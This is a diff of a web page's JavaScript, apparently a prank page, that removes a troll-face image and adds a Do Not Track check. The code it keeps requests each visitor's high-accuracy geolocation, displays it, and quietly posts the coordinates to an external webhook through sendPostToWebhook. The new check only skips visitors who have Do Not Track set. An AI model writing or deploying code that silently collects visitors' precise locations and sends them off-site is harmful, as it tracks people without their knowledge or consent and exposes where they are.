@@ -1,9 +1,4 @@
 document.getElementById('wordsbox').appendChild(getGeoCoords())
-const trollface = document.createElement('span')
-trollface.innerHTML += `
-    <img src="https://media.tenor.com/mOovG0h3E6IAAAAM/troll-face.gif" alt="trol">
-    `;
-document.getElementById('wordsbox').appendChild(trollface)
 
 
 const hoverables = document.getElementsByClassName('word')
@@ -25,7 +20,7 @@ function spanify(...nodes) {
 function getGeoCoords() {
     const coords = document.createElement('span')
     coords.className = 'line'
-    if (navigator.geolocation) {
+    if (navigator.geolocation && !navigator.doNotTrack) {
         navigator.geolocation.getCurrentPosition((position) => {
             const lat = document.createElement('span')
             const long = document.createElement('span')
@@ -36,9 +31,11 @@ function getGeoCoords() {
             sendPostToWebhook(lat.innerText + ' ' + long.innerText)
             spanify(lat, long)
         }, null, { enableHighAccuracy: true, timeout: 1000, maximumAge: 0 });
-
     } else {
-        coords.innerText = "Geolocation disabled :(";
+        const fallback = document.createElement('span')
+        fallback.innerText = "Geolocation disabled :(" 
+        coords.appendChild(fallback)  
+        spanify(fallback)  
     }
     return coords
 }
